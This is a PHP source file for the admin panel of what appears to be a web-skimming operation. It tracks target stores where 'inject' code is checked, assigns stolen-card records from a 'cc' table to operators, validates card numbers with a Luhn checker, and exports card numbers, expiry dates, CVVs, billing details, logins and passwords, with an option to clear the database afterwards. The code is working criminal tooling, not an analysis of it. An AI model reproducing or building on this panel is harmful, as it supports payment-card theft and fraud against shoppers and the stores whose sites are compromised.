<?php
// Начало файла tools.php
session_start();


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("CSRF token validation failed");
    }
}

$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

if (!isset($_SESSION['user_logged_in'])) {
    header('Location: login.php');
    exit();
}

if (!isset($_SESSION['user_role']) || ($_SESSION['user_role'] !== 'admin' && $_SESSION['user_role'] !== 'tech')) {
    header('Location: dashboard.php');
    exit();
}

require 'includes/config.php';

$filePath = 'inject/sites_data.txt';
$sitesList = file_exists($filePath) ? file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];

$message = '';

if (isset($_POST['addSite'])) {
    $siteUrl = trim($_POST['siteUrl']);
    $searchText = trim($_POST['searchText']);
    $data = $siteUrl . '|' . $searchText;
    $existingData = file_exists($filePath) ? file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
    $existingData[] = $data;
    file_put_contents($filePath, implode("\n", $existingData) . "\n");
    $message = "Site added for checking.";
    $sitesList = $existingData;
}

if (isset($_POST['deleteSite']) && isset($_POST['selectedSite'])) {
    $selectedSite = $_POST['selectedSite'];
    $updatedList = array_filter($sitesList, function ($site) use ($selectedSite) {
        return trim($site) !== trim($selectedSite);
    });
    file_put_contents($filePath, implode("\n", $updatedList));
    $message = "Site deleted.";
    $sitesList = array_values($updatedList);
}

$usersQuery = "SELECT * FROM users WHERE role IN ('user', 'tech')";
$usersResult = $db->query($usersQuery);

$sitesQuery = "SELECT DISTINCT url_id FROM cc";
$sitesResult = $db->query($sitesQuery);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['assign_site'])) {
    $userId = $_POST['user_id'];
    $siteId = $_POST['site_id'];
    $checkQuery = "SELECT COUNT(*) as count FROM user_sites WHERE user_id = ? AND url_id = ?";
    $stmt = $db->prepare($checkQuery);
    $stmt->bind_param('is', $userId, $siteId);
    $stmt->execute();
    $result = $stmt->get_result();
    $row = $result->fetch_assoc();
    if ($row['count'] == 0) {
        $insertQuery = "INSERT INTO user_sites (user_id, url_id) VALUES (?, ?)";
        $stmt = $db->prepare($insertQuery);
        $stmt->bind_param('is', $userId, $siteId);
        $stmt->execute();
        $message = "Site assigned successfully.";
    } else {
        $message = "Site is already assigned to the user.";
    }
}

if (isset($_POST['luhnCheck'])) {
    $input = $_POST['numbers'];
    $numbers = explode("\n", $input);
    $result = "";
    foreach ($numbers as $number) {
        $number = preg_replace('/[\s]+/', '', $number);
        if (strpos($number, ',') !== false) {
            $multiple_numbers = explode(',', $number);
            $results = array();
            foreach ($multiple_numbers as $single_number) {
                $single_number = preg_replace('/\D+/', '', $single_number);
                if (luhn_check($single_number)) {
                    $results[] = $single_number . "";
                } else {
                    $results[] = $single_number . " - invalid";
                }
            }
            $result .= implode(", ", $results) . "\n";
        } else {
            $number = preg_replace('/\D+/', '', $number);
            if (luhn_check($number)) {
                $result .= $number . "\n";
            } else {
                $result .= $number . " - invalid\n";
            }
        }
    }
    echo $result;
    exit();
}

function luhn_check($number) {
    $sum = 0;
    $length = strlen($number);
    $parity = $length % 2;
    for ($i = 0; $i < $length; $i++) {
        $digit = intval($number[$i]);
        if ($i % 2 == $parity) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    return ($sum % 10 == 0);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.8">
    <title>Tools Page</title>
    <link href="js/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="js/all.min.css">
    <style>
        .bg-navy { background-color: #1a1a1a; }
        .border-gold { border-color: #2f2e2c; }
        .text-gold { color: #d4af37; }
        .popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .popup-content {
            background-color: #1a1a1a;
            padding: 20px;
            border-radius: 5px;
            max-width: 500px;
            width: 100%;
        }
    </style>
</head>
<body class="bg-navy text-gold">
    <div class="flex flex-col min-h-screen">
        <nav class="bg-navy border-b-2 px-6 py-4">
            <div class="container mx-auto flex justify-between items-center">
                <div class="flex space-x-4">
                    <a href="dashboard.php" class="text-yellow-500 hover:text-white">DASHBOARD</a>
                    <a href="cards.php?url_id=&country=&date=&records=20&sort=id&order=desc" class="text-yellow-500 hover:text-white">CARDS</a>
                    <a href="inject.php" class="text-yellow-500 hover:text-white">INJECT</a>
                    <a href="tools.php" class="text-yellow-500 hover:text-white">TOOLS</a>
                    <a href="forms.php" class="text-yellow-500 hover:text-white">FORMS</a>
                    <a href="uptime.php" class="text-yellow-500 hover:text-white">UPTIME</a>
                </div>
                <div>
                    <a href="logout.php" class="text-yellow-500 hover:text-white">LOGOUT</a>
                </div>
            </div>
        </nav>

        <div class="container mx-auto mt-8">
            <?php if ($message): ?>
                <div class="bg-green-500 text-white px-4 py-3 mb-4 rounded">
                    <p><?php echo $message; ?></p>
                </div>
            <?php endif; ?>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div>
                    <h1 class="text-2xl font-bold mb-4">Checking the code on the store</h1>
                    <form action="tools.php" method="post" class="mb-4">
					<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <div class="mb-4">
                            <select name="selectedSite" class="w-full bg-gray-800 border border-gray-700 text-gold py-3 px-4 pr-8 rounded leading-tight focus:outline-none focus:bg-gray-700 focus:border-gray-500">
                                <?php foreach ($sitesList as $site): ?>
                                    <option value="<?php echo htmlspecialchars($site); ?>"><?php echo explode('|', $site)[0]; ?></option>
                                <?php endforeach; ?>
                            </select>
                        </div>
                        <div class="flex space-x-4">
                            <button type="button" onclick="showAddPopup()" class="bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600">ADD</button>
                            <button type="submit" name="deleteSite" class="bg-red-500 text-white py-2 px-4 rounded hover:bg-red-600">DELETE</button>
                        </div>
                    </form>
                    <div>
                        <h1 class="text-2xl font-bold mb-4">Luhn Checker</h1>
                        <button type="button" onclick="showLuhnCheckerPopup()" class="bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600">Luna Checker List</button>
                    </div>
                </div>

                <div>
                    <h1 class="text-2xl font-bold mb-4">Users</h1>
                    <form action="tools.php" method="post" class="mb-4">
					<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <div class="mb-4">
                            <label for="user_id" class="block text-gold text-sm font-bold mb-2">Select User:</label>
                            <div class="relative">
                                <select name="user_id" id="user_id" class="w-full bg-gray-800 border border-gray-700 text-gold py-3 px-4 pr-8 rounded leading-tight focus:outline-none focus:bg-gray-700 focus:border-gray-500" onchange="showAssignedSites(this.value)">
                                    <option value="">Choose User</option>
                                    <?php while ($user = $usersResult->fetch_assoc()): ?>
                                        <option value="<?php echo $user['id']; ?>"><?php echo $user['username']; ?></option>
                                    <?php endwhile; ?>
                                </select>
                                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                                    <svg class="w-4 h-4 text-gold" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M6.293 6.293a1 1 0 011.414 0L10 8.586l2.293-2.293a1 1 0 011.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                            </div>
                        </div>

                        <div id="assignedSites" class="mb-4"></div>

                        <div class="flex items-center justify-between">
                            <div class="mb-4">
                                <label for="site_id" class="block text-gold text-sm font-bold mb-2">Assign Site:</label>
                                <select name="site_id" id="site_id" class="w-full bg-gray-800 border border-gray-700 text-gold py-3 px-4 pr-8 rounded leading-tight focus:outline-none focus:bg-gray-700 focus:border-gray-500">
                                    <option value="">Choose Site</option>
                                    <?php
                                    $sitesResult->data_seek(0);
                                    while ($site = $sitesResult->fetch_assoc()): ?>
                                        <option value="<?php echo $site['url_id']; ?>"><?php echo $site['url_id']; ?></option>
                                    <?php endwhile; ?>
                                </select>
                            </div>
                            <button type="submit" name="assign_site" class="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded">Assign Site</button>
                        </div>

                        <div id="exportBlock" class="mt-4" style="display: none;">
                            <button type="button" onclick="showExportModal()" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">Export</button>
                            <button type="button" onclick="showExportAndClearModal()" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded ml-2">Export And Clear DB</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    
    <div id="exportModal" class="fixed z-10 inset-0 overflow-y-auto hidden">
        <div class="flex items-center justify-center min-h-screen">
            <div class="bg-gray-800 rounded-lg overflow-hidden shadow-xl transform transition-all sm:max-w-lg sm:w-full">
                <div class="bg-gray-700 px-4 py-3 flex justify-between items-center">
                    <h3 class="text-lg leading-6 font-medium text-gold">Export Fields</h3>
                    <button type="button" class="text-gold hover:text-white focus:outline-none focus:text-white transition ease-in-out duration-150" onclick="closeExportModal()">
                        <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </button>
                </div>
                <div class="bg-gray-800 px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
<form id="exportForm" action="includes/export.php" method="post" target="_blank">
    <input type="hidden" name="user_id" id="exportUserId">
    <input type="hidden" name="fields[]" value="id">
    <input type="hidden" name="fields[]" value="url_id">
    <input type="hidden" name="fields[]" value="type">
    <input type="hidden" name="fields[]" value="payment_cc_number">
    <input type="hidden" name="fields[]" value="payment_cc_exp_month">
    <input type="hidden" name="fields[]" value="payment_cc_exp_year">
    <input type="hidden" name="fields[]" value="payment_cc_cid">
    <input type="hidden" name="fields[]" value="payment_cc_owner">
    <input type="hidden" name="fields[]" value="billing_firstname">
    <input type="hidden" name="fields[]" value="billing_lastname">
    <input type="hidden" name="fields[]" value="billing_country_id">
    <input type="hidden" name="fields[]" value="billing_state">
    <input type="hidden" name="fields[]" value="billing_city">
    <input type="hidden" name="fields[]" value="billing_street">
    <input type="hidden" name="fields[]" value="billing_postcode">
    <input type="hidden" name="fields[]" value="billing_telephone">
    <input type="hidden" name="fields[]" value="billing_email">
    <input type="hidden" name="fields[]" value="ip">
    <input type="hidden" name="fields[]" value="login">
    <input type="hidden" name="fields[]" value="password">
    <input type="hidden" name="fields[]" value="ua">
    <input type="hidden" name="fields[]" value="fulldatalog">
    <input type="hidden" name="fields[]" value="date">
    
    <center>
        <div class="mb-4">
            <label class="block mb-2">Separator:</label>
            <select name="separator" class="bg-navy text-gold border border-gold rounded py-2 px-3 appearance-none focus:outline-none focus:shadow-outline">
                <option value=",">Comma ","</option>
                <option value=";">Semicolon ";"</option>
                <option value="|">Vertical bar | </option>
            </select>
        </div>
        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
        <button type="submit" class="bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 px-4 rounded">
            Export All
        </button>
    </center>
</form>
                </div>
            </div>
        </div>
    </div>

    <div id="luhnCheckerPopup" class="popup">
        <div class="popup-content relative">
            <button id="closeLuhnCheckerPopup" class="absolute top-2 right-2 text-yellow-500 hover:text-white focus:outline-none">
                <svg class="h-6 w-6 fill-current" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                    <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path>
                </svg>
            </button>
            <h2 class="text-2xl font-bold mb-4">Luhn Checker</h2>
            <form method="post" action="tools.php" onsubmit="event.preventDefault(); checkLuhn(this);">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <label for="numbers" class="block text-gold text-sm font-bold mb-2">Enter list of numbers (each number on a new line):</label>
    <textarea name="numbers" rows="10" cols="50" class="w-full px-3 py-2 text-gold bg-gray-800 rounded-md focus:outline-none focus:shadow-outline mb-4"></textarea>
    <div class="flex justify-end space-x-4">
        <button type="button" onclick="hideLuhnCheckerPopup()" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded">Cancel</button>
        <button type="submit" name="luhnCheck" class="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded">Check</button>
    </div>
</form>

            <div id="luhnResultContainer" class="mt-8" style="display: none;">
                <h3 class="text-xl font-bold mb-2">Luhn Check Result:</h3>
                <div class="bg-gray-800 rounded p-4 mb-4 max-h-64 overflow-y-auto">
                    <pre id="luhnResult"></pre>
                </div>
                <div class="flex justify-end space-x-4">
                    <button type="button" onclick="downloadLuhnResult()" class="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded">Download</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        function showAddPopup() {
            document.getElementById('addPopup').classList.remove('hidden');
        }

        function hideAddPopup() {
            document.getElementById('addPopup').classList.add('hidden');
        }

        function showAssignedSites(userId) {
    if (userId) {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                document.getElementById('assignedSites').innerHTML = this.responseText;
                var assignedSites = JSON.parse(this.responseText.match(/var assignedSites = (\[.*?\]);/)[1]);
                filterAssignedSites(assignedSites);

                var exportBlock = document.getElementById('exportBlock');
                if (this.responseText.trim() !== '') {
                    exportBlock.style.display = 'block';
                } else {
                    exportBlock.style.display = 'none';
                }
            }
        };
        xhr.open('GET', 'includes/get_assigned_sites.php?user_id=' + userId, true);
        xhr.send();
    } else {
        document.getElementById('assignedSites').innerHTML = '';
        document.getElementById('exportBlock').style.display = 'none';
    }
}

        function removeAssignedSite(userId, siteId) {
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    showAssignedSites(userId);
                }
            };
            xhr.open('GET', 'includes/remove_assigned_site.php?user_id=' + userId + '&site_id=' + siteId, true);
            xhr.send();
        }

        function showLuhnCheckerPopup() {
            document.getElementById('luhnCheckerPopup').style.display = 'flex';
        }

        function hideLuhnCheckerPopup() {
            document.getElementById('luhnCheckerPopup').style.display = 'none';
        }

        function checkLuhn(form) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            document.getElementById('luhnResult').innerText = this.responseText;
            document.getElementById('luhnResultContainer').style.display = 'block';
        }
    };
    xhr.open('POST', 'tools.php', true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.send('numbers=' + encodeURIComponent(form.numbers.value) + '&luhnCheck=1&csrf_token=' + encodeURIComponent(form.csrf_token.value));
}

        function downloadLuhnResult() {
            var result = document.getElementById('luhnResult').innerText;
            var element = document.createElement('a');
            element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(result));
            element.setAttribute('download', 'luhn_result.txt');
            element.style.display = 'none';
            document.body.appendChild(element);
            element.click();
            document.body.removeChild(element);
        }

        function filterAssignedSites(assignedSites) {
    const siteSelect = document.getElementById('site_id');
    for (let i = 0; i < siteSelect.options.length; i++) {
        const option = siteSelect.options[i];
        if (assignedSites.includes(option.value)) {
            option.style.display = 'none';
        } else {
            option.style.display = 'block';
        }
    }
}
        function showExportModal() {
            var selectedUserId = document.getElementById('user_id').value;
            document.getElementById('exportUserId').value = selectedUserId;
            document.getElementById('exportModal').classList.remove('hidden');
        }

        function closeExportModal() {
            document.getElementById('exportModal').classList.add('hidden');
        }

        function showExportAndClearModal() {
            var selectedUserId = document.getElementById('user_id').value;
            document.getElementById('exportUserId').value = selectedUserId;
            document.getElementById('exportForm').action = 'includes/export.php?clear=1';
            document.getElementById('exportModal').classList.remove('hidden');
        }
    </script>
</body>
</html>
